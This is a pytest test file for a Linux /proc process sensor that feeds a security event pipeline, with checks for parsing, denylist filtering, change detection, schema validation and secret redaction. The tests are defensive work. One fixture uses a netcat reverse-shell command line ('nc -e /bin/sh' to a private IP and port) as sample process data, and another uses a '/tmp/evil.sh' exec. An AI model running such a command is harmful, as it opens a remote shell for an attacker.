"""
Tests for the /proc process sensor.

Most tests build a synthetic /proc tree so they run anywhere (including
Windows CI) and so edge cases like a process named ``weird (name) here``
can be constructed deliberately rather than hoped for.
"""

import os
import sys
from pathlib import Path

import pytest

from forwarder import procfs_sensor as ps
from forwarder.config import Config
from forwarder.procfs_sensor import (
    ProcfsSensor,
    _fingerprint,
    _read_stat,
    _read_status,
)
from forwarder.transformer import transform_event


# ── synthetic /proc helpers ─────────────────────────────────────

def make_proc(
    root: Path,
    pid: int,
    comm: str,
    cmdline: list[str] | None = None,
    ppid: int = 1,
    uid: int = 0,
    state: str = "S",
    vmrss: int = 2048,
    threads: int = 1,
    exe: str | None = None,
    starttime: int = 1000,
) -> Path:
    d = root / str(pid)
    d.mkdir(parents=True, exist_ok=True)
    # Real /proc/PID/stat layout after comm:
    #   3 state 4 ppid 5 pgrp 6 session 7 tty_nr 8 tpgid 9 flags
    #   10-13 faults 14-17 times 18 priority 19 nice 20 num_threads
    #   21 itrealvalue 22 starttime 23 vsize 24 rss
    # Note there is deliberately no UID here - the sensor must read it from
    # /proc/PID/status, not from stat.
    fields = ["0"] * 30
    fields[0] = state          # field 3
    fields[1] = str(ppid)      # field 4
    fields[4] = "-1"           # field 7  tty_nr
    fields[17] = str(threads)  # field 20 num_threads
    fields[19] = str(starttime)  # field 22 starttime
    stat = f"{pid} ({comm}) " + " ".join(fields)
    (d / "stat").write_text(stat + "\n")
    (d / "cmdline").write_bytes(b"".join(a.encode() + b"\0" for a in (cmdline or [])))
    (d / "status").write_text(
        f"Name:\t{comm}\nUid:\t{uid}\t{uid}\t{uid}\t{uid}\n"
        f"VmRSS:\t{vmrss} kB\nThreads:\t{threads}\n"
    )
    if exe is not None:
        # exe is a symlink; on platforms without symlink perms we skip it.
        try:
            (d / "exe").symlink_to(exe)
        except (OSError, NotImplementedError):
            pass
    return d


@pytest.fixture
def cfg():
    class C(Config):
        PROCFS_POLL_INTERVAL = 0.5
        PROCFS_DENYLIST = "sshd,cron"
        PROCFS_EMIT_EXITS = True
        PROCFS_MAX_ARGS = 32
        PRIVACY_REDACTION_ENABLED = True

    return C()


@pytest.fixture
def sensor(cfg, tmp_path, monkeypatch):
    monkeypatch.setattr(ps, "PROC_ROOT", tmp_path)
    # Pretend our own lineage is empty so tests control every PID.
    s = ProcfsSensor(cfg)
    s._self_pids = set()
    return s


# ── /proc/PID/stat parsing ──────────────────────────────────────

def test_stat_parses_simple_comm(tmp_path, monkeypatch):
    monkeypatch.setattr(ps, "PROC_ROOT", tmp_path)
    make_proc(tmp_path, 42, "bash", ppid=7, uid=1000)
    stat = _read_stat(42)
    assert stat is not None
    assert stat["comm"] == "bash"
    assert stat["ppid"] == 7
    assert stat["starttime"] == 1000


def test_stat_has_no_uid_field(tmp_path, monkeypatch):
    """/proc/PID/stat does not carry UID; the sensor must not pretend it does."""
    monkeypatch.setattr(ps, "PROC_ROOT", tmp_path)
    make_proc(tmp_path, 43, "x", uid=1234)
    stat = _read_stat(43)
    assert "uid" not in stat

    # UID must come from status instead.
    sensor_pid_dir = tmp_path / "43"
    assert _read_status(sensor_pid_dir)["uid"] == 1234


def test_stat_handles_comm_with_spaces_and_parens(tmp_path, monkeypatch):
    """comm is arbitrary bytes and may contain both spaces and parentheses."""
    monkeypatch.setattr(ps, "PROC_ROOT", tmp_path)
    tricky = "weird (name) here"
    make_proc(tmp_path, 99, tricky, ppid=3)
    stat = _read_stat(99)
    assert stat is not None
    # Parsing anchors on the LAST ')', so the full name survives.
    assert stat["comm"] == tricky
    assert stat["ppid"] == 3


def test_stat_returns_none_for_missing_pid(tmp_path, monkeypatch):
    monkeypatch.setattr(ps, "PROC_ROOT", tmp_path)
    assert _read_stat(12345) is None


# ── filtering ───────────────────────────────────────────────────

def test_emits_new_process(sensor, tmp_path):
    make_proc(tmp_path, 100, "curl", cmdline=["/usr/bin/curl", "http://x/y"], uid=1000)
    events = sensor.scan_once()
    assert len(events) == 1
    assert "process_exec" in events[0]


def test_skips_denylisted_comm(sensor, tmp_path):
    make_proc(tmp_path, 101, "sshd", cmdline=["/usr/sbin/sshd", "-D"], ppid=1)
    make_proc(tmp_path, 102, "cron", cmdline=["/usr/sbin/cron"], ppid=1)
    events = sensor.scan_once()
    assert events == []


def test_denylist_matches_comm_not_argv(sensor, tmp_path):
    """A process must not evade the denylist by mentioning it in argv."""
    make_proc(tmp_path, 103, "python3", cmdline=["python3", "-c", "spawn sshd"], ppid=1)
    events = sensor.scan_once()
    assert len(events) == 1  # python3 observed; it is not sshd


def test_skips_kernel_threads(sensor, tmp_path):
    # Empty cmdline + ppid 2 == kernel thread.
    make_proc(tmp_path, 2, "kthreadd", cmdline=[], ppid=0)
    make_proc(tmp_path, 104, "kworker/0:1", cmdline=[], ppid=2)
    events = sensor.scan_once()
    assert events == []


def test_skips_self_lineage(tmp_path, cfg, monkeypatch):
    monkeypatch.setattr(ps, "PROC_ROOT", tmp_path)
    make_proc(tmp_path, 10, "myshell", cmdline=["/bin/bash"], ppid=1)
    make_proc(tmp_path, 11, "sensor", cmdline=["python", "-m", "forwarder.main"], ppid=10)
    make_proc(tmp_path, 12, "other", cmdline=["/usr/bin/other"], ppid=1)
    s = ProcfsSensor(cfg)
    s._self_pids = {10, 11}
    events = s.scan_once()
    assert len(events) == 1
    # The survivor is the unrelated process.
    assert events[0]["process_exec"]["process"]["pid"] == 12


# ── change detection ────────────────────────────────────────────

def test_second_scan_is_quiet_when_nothing_changed(sensor, tmp_path):
    make_proc(tmp_path, 200, "nginx", cmdline=["nginx: worker"], ppid=1)
    first = sensor.scan_once()
    assert len(first) == 1
    second = sensor.scan_once()
    assert second == []


def test_exec_in_place_emits_again(sensor, tmp_path):
    d = make_proc(tmp_path, 201, "sh", cmdline=["/bin/sh", "-c", "sleep 1"], ppid=1)
    sensor.scan_once()
    # Same PID, new argv => exec-in-place must resurface.
    (d / "cmdline").write_bytes(b"/bin/bash\x00/tmp/evil.sh\x00")
    events = sensor.scan_once()
    assert len(events) == 1
    proc = events[0]["process_exec"]["process"]
    assert proc["pid"] == 201
    assert "/tmp/evil.sh" in proc["arguments"]


def test_small_rss_churn_does_not_resurface(sensor, tmp_path):
    """RSS is bucketed, so ordinary memory drift must not look like an exec."""
    d = make_proc(tmp_path, 202, "memhog", cmdline=["/usr/bin/memhog"], vmrss=2048)
    sensor.scan_once()
    (d / "status").write_text("Name:\tmemhog\nUid:\t0\nVmRSS:\t2100 kB\nThreads:\t1\n")
    assert sensor.scan_once() == []


def test_emits_exit_when_process_disappears(sensor, tmp_path):
    import shutil

    d = make_proc(tmp_path, 300, "ephemeral", cmdline=["/bin/true"], ppid=1)
    sensor.scan_once()
    shutil.rmtree(d)
    events = sensor.scan_once()
    exits = [e for e in events if "process_exit" in e]
    assert len(exits) == 1
    assert exits[0]["process_exit"]["process"]["pid"] == 300


# ── shaping ─────────────────────────────────────────────────────

def test_argv0_not_duplicated_into_args(sensor, tmp_path):
    """If /proc/PID/exe resolves, argv[0] must not repeat it in args."""
    make_proc(tmp_path, 400, "curl", cmdline=["/usr/bin/curl", "-s", "http://x"], exe="/usr/bin/curl")
    events = sensor.scan_once()
    proc = events[0]["process_exec"]["process"]
    assert proc["binary"] == "/usr/bin/curl"
    assert "-s" in proc["arguments"]
    assert "/usr/bin/curl" not in proc["arguments"]


def test_missing_exe_falls_back_to_argv0(sensor, tmp_path):
    make_proc(tmp_path, 401, "sh", cmdline=["/bin/sh", "-l"])
    proc = sensor.scan_once()[0]["process_exec"]["process"]
    assert proc["binary"] == "/bin/sh"


def test_max_args_truncates(sensor, tmp_path):
    many = [f"arg{i}" for i in range(500)]
    make_proc(tmp_path, 402, "big", cmdline=many)
    proc = sensor.scan_once()[0]["process_exec"]["process"]
    assert len(proc["arguments"]) <= sensor._max_args


def test_sensor_context_is_carried(sensor, tmp_path):
    make_proc(tmp_path, 403, "threaded", cmdline=["/bin/x"], threads=9, vmrss=4096)
    payload = sensor.scan_once()[0]["process_exec"]
    assert payload["sensor"]["threads"] == 9
    assert payload["sensor"]["rss_kb"] == 4096


# ── integration with the unified schema ─────────────────────────

def test_procfs_event_validates_against_contract(sensor, tmp_path):
    """The whole point: procfs output must be a first-class contract event."""
    from forwarder.validator import validate_security_event

    make_proc(tmp_path, 500, "nc", cmdline=["nc", "-e", "/bin/sh", "10.0.0.5", "4444"], uid=0)
    raw = sensor.scan_once()[0]
    event = transform_event(raw, capture_mode="procfs_live", config=sensor.config)

    assert event is not None
    ok, err = validate_security_event(event)
    assert ok, f"contract validation failed: {err}"
    assert event["capture_mode"] == "procfs_live"
    assert event["event_source"] == "procfs"
    assert event["event_type"] == "process_exec"


def test_procfs_events_are_redacted(sensor, tmp_path):
    """Redaction must run before persistence, including for the live sensor."""
    make_proc(
        tmp_path,
        501,
        "curl",
        cmdline=["curl", "--token=SUPERSECRETVALUE", "http://10.1.2.3/x"],
        uid=0,
    )
    event = transform_event(
        sensor.scan_once()[0], capture_mode="procfs_live", config=sensor.config
    )
    blob = str(event)
    assert "SUPERSECRETVALUE" not in blob
    assert event["privacy"]["redacted"] is True


# ── misc ────────────────────────────────────────────────────────

def test_snapshot_respects_denylist(sensor, tmp_path):
    make_proc(tmp_path, 600, "visible", cmdline=["/bin/visible"], ppid=1)
    make_proc(tmp_path, 601, "sshd", cmdline=["/usr/sbin/sshd"], ppid=1)
    rows = sensor.snapshot()
    comms = {r["comm"] for r in rows}
    assert "visible" in comms
    assert "sshd" not in comms


def test_fingerprint_changes_with_argv():
    base = {"exe": "/bin/x", "cmdline": ["a"], "rss_kb": 100}
    other = {"exe": "/bin/x", "cmdline": ["b"], "rss_kb": 100}
    assert _fingerprint(base) != _fingerprint(other)


def test_scan_survives_process_vanishing_mid_pass(sensor, tmp_path):
    """A PID that disappears between iterdir() and read is normal, not fatal."""
    make_proc(tmp_path, 700, "ghost", cmdline=["/bin/ghost"], ppid=1)
    # No /proc for 701 at all; scanning must not raise.
    events = sensor.scan_once()
    assert len(events) == 1
    assert sensor.last_error is None


@pytest.mark.skipif(sys.platform == "win32", reason="POSIX /proc required")
def test_live_scan_on_real_proc():
    """Smoke test against the real process table, when available."""
    root = Path("/proc")
    if not root.is_dir():
        pytest.skip("/proc not present")

    class C(Config):
        PROCFS_DENYLIST = ""
        PROCFS_EMIT_EXITS = False

    sensor = ProcfsSensor(C())
    sensor._self_pids = set()
    events = sensor.scan_once()
    assert events, "expected at least one process on a live system"
    for raw in events:
        assert "process_exec" in raw or "process_exit" in raw


@pytest.mark.skipif(not Path("/proc/1/stat").exists(), reason="POSIX /proc required")
def test_detects_our_own_lineage_is_excluded():
    """The sensor must never observe itself or the shell driving it."""
    sensor = ProcfsSensor(Config())
    assert os.getpid() in sensor._self_pids
    assert len(sensor._self_pids) >= 1